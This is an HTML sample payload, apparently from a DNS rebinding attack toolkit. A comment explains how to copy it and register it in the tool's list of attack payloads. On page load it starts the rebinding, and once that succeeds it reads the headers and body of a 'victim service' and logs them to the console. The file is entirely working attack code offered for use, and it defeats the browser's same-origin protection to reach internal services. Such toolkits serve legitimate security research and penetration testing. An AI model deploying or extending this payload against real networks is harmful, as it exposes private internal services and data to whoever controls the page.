<!--
This is a sample payload to make a simple GET request and display the response.
Copy the content of this file to a new .html file and add its name to the
`attackPayloads` list in the manager-config.json file.
-->
<!doctype html>
<html>

<head>
	<title>payload-simple-get</title>
	<script src="payload.js"></script>
	<script>
		// attack() is called once DNS rebinding is successful
		// headers and body contains server data obtained 
		// from the victim service during rebinding, if any.
		function attack(headers, body) {
			if (headers !== null) { 
			console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
			}
			if (body !== null) {
			console.log(`Origin: ${window.location} body:\n${body}`);
			}
		}
	</script>
</head>

<body onload="begin('/')")>
	<h3>Simple Fetch Payload</h3>
	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body></html>
